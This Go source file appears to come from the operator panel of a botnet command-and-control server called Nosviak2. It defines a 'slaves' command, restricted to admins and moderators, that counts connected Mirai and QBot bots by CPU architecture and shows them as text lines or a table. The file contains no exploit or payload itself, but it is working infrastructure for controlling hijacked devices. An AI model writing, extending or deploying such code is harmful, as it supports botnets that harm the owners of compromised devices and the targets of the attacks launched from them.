package commands

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/clients/views/pager"
	deployment "Nosviak2/core/configs"
	"Nosviak2/core/sources/language"
	"Nosviak2/core/sources/language/lexer"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/sources/views"

	//"Nosviak2/core/slaves/mirai"
	//"Nosviak2/core/slaves/qbot"
	"Nosviak2/core/slaves"

	"strconv"
	"strings"

	"github.com/alexeyco/simpletable"
)

func init() {

	MakeCommand(&Command{
		CommandName:        "slaves",
		Aliases:            []string{"slave", "connected", "connections", "devices", "device", "bots", "bot"},
		CommandPermissions: []string{"admin", "moderator"},
		CommandDescription: "display all slaves connection properly",
		CommandFunction: func(s *sessions.Session, cmd []string) error {

			//checks for the usage of the table properly
			//this will follow through with displaying it without a table
			if !toml.ConfigurationToml.Slaves.UseTable { //checks for false types

				//ranges through all of our archs properly
				//this will allow us to display each line properly
				for arch, amount := range slaves.MakeMappableSheet()[0] {

					//renders the layer properly and safely onto the terminal screen
					language.ExecuteLanguage([]string{"commands", "slaves", "text", "layer.itl"}, s.Channel, deployment.Engine, s, map[string]string{"type": "mirai", "arch": arch, "connected": strconv.Itoa(amount)})

				}

				//ranges through all of our archs properly
				//this will allow us to display each line properly
				for arch, amount := range slaves.MakeMappableSheet()[1] {

					//renders the layer properly and safely onto the terminal screen
					language.ExecuteLanguage([]string{"commands", "slaves", "text", "layer.itl"}, s.Channel, deployment.Engine, s, map[string]string{"type": "qbot", "arch": arch, "connected": strconv.Itoa(amount)})

				}

				return nil //ends function properly
			}
			//creates the simpletable
			//this will store our information
			table := simpletable.New() //makes the structure
			//sets table header
			//this will be used to define information
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{ //sets the values properly without issues happening
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "slaves", "headers", "type.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "slaves", "headers", "arch.txt").Containing, lexer.Escapes)},
					{Align: simpletable.AlignCenter, Text: lexer.AnsiUtil(views.GetView("commands", "slaves", "headers", "amount.txt").Containing, lexer.Escapes)},
				},
			}

			//ranges through every opens ession
			//this will make sure its done without issues
			for arch, count := range slaves.MakeMappableSheet()[0] { //ranges through all users sessions
				//creates the store properly without issues
				rk := []*simpletable.Cell{ //fills with the information properly without issues
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "type.txt").Containing, lexer.Escapes), "<<$type>>", "mirai")},                 //id
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "arch.txt").Containing, lexer.Escapes), "<<$arch>>", arch)},                    //id
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "amount.txt").Containing, lexer.Escapes), "<<$amount>>", strconv.Itoa(count))}, //username
				}

				//saves into the array correctly
				//this will be properly founded later onwards
				table.Body.Cells = append(table.Body.Cells, rk)
			}

			//ranges through every opens ession
			//this will make sure its done without issues
			for arch, count := range slaves.MakeMappableSheet()[1] { //ranges through all users sessions
				//creates the store properly without issues
				rk := []*simpletable.Cell{ //fills with the information properly without issues
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "type.txt").Containing, lexer.Escapes), "<<$type>>", "qbot")},                  //id
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "arch.txt").Containing, lexer.Escapes), "<<$arch>>", arch)},                    //id
					{Align: simpletable.AlignCenter, Text: strings.ReplaceAll(lexer.AnsiUtil(views.GetView("commands", "slaves", "values", "amount.txt").Containing, lexer.Escapes), "<<$amount>>", strconv.Itoa(count))}, //username
				}

				//saves into the array correctly
				//this will be properly founded later onwards
				table.Body.Cells = append(table.Body.Cells, rk)
			}

			//renders the table properly without issues
			//this will ensure its done without any errors happening
			return pager.MakeTable("slaves", table, s).TextureTable()
		},
	})
}
